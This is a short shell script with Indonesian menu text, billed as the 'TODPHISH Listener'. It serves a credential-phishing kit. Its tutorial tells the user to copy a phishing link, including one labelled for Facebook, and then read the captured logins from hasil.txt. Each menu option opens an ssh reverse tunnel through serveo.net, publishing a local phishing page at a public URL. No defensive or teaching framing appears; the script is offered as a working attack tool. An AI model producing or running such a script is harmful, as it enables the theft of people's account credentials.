clear                                                               
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo                                                 
pur='\033[35;1m' #purple                                            
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah                                              
pu='\033[37;1m' #putih                                              
ku='\033[33;1m' #kuning
echo $i" Welcome to TODPHISH Listener"
echo $i" TUTORIAL"
echo $pur"___________________________________"
echo $ku" 1.pilih link yang mau kamu pakai untuk phising lalu copy"
echo $ku" 2.tunggu hingga log berjalan sampai /aman.php atau /login.html"
echo $ku" 4.silahkan buka hasil.txt di direktori Phisingnya"
echo $ku" 5.buka menggunakan perintah" $pur"nano hasil.txt"
echo $pur"___________________________________"
echo $pur" GENERATE LINK"
echo $pur"["$ku"1"$pur"]"$ku" FACEBOOK LINK"
echo $pur"["$ku"2"$pur"]"$ku" OTHER LINK"
echo $pur"___________________________________"
echo $pur"╭─["$pur"root@D'JøKëRs"$pur"]"
read -p"╰─>> " pil
echo $pur"___________________________________"
if [ $pil = 1 ]
then
ssh -R https://valeo.serveo.net:80:localhost:8080 serveo.net
fi

if [ $pil = 2 ]
then
ssh -R https://recepi.serveo.net:80:localhost:8080 serveo.net
fi
